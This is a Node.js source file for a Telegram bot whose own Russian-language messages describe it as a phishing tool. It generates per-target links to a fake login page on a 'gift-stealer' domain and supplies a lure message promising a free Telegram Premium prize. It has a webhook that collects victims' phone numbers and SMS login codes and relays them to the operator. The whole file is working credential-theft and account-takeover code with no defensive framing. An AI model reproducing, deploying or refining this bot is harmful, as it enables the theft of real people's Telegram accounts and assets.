const TelegramBot = require('node-telegram-bot-api');
const express = require('express');

const TOKEN = 'YOUR_BOT_TOKEN_HERE';
const DOMAIN = 'https://telegram-gift-stealer.vercel.app';

const bot = new TelegramBot(TOKEN, {polling: true});
const app = express();
app.use(express.json());

// Хранилище в памяти
const links = new Map();

bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id, 
        `🎁 *Telegram Gift Collector Bot*\n\n` +
        `/generate @username - Создать фишинг-ссылку\n` +
        `Автоматический сбор номеров и кодов\n` +
        `Автоперевод подарков на ваш аккаунт`,
        {parse_mode: 'Markdown'}
    );
});

bot.onText(/\/generate (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const target = match[1];
    const code = Math.random().toString(36).substring(7);
    
    links.set(code, {chatId, target});
    
    const url = `${DOMAIN}/login.html?code=${code}`;
    const shortUrl = `https://tinyurl.com/${code}`;
    
    bot.sendMessage(chatId,
        `✅ *Ссылка создана*\n\n` +
        `*Цель:* ${target}\n` +
        `*Код:* \`${code}\`\n` +
        `*URL:* ${url}\n` +
        `*Сокращенная:* ${shortUrl}\n\n` +
        `*Сообщение для жертвы:*\n` +
        `"🎉 Поздравляем! Вы выиграли Telegram Premium! ${shortUrl}"`,
        {parse_mode: 'Markdown'}
    );
});

// Вебхук для данных
app.post('/webhook', (req, res) => {
    const {code, phone, sms_code} = req.body;
    const link = links.get(code);
    
    if (link) {
        bot.sendMessage(link.chatId,
            `🎯 *ДАННЫЕ ПОЛУЧЕНЫ*\n\n` +
            `*Код:* \`${code}\`\n` +
            `*Номер:* \`${phone}\`\n` +
            `*SMS код:* \`${sms_code}\`\n` +
            `*Цель:* ${link.target}\n` +
            `*Автоперенос подарков...*`,
            {parse_mode: 'Markdown'}
        );
    }
    res.json({success: true});
});

app.listen(3000, () => console.log('Bot running'));
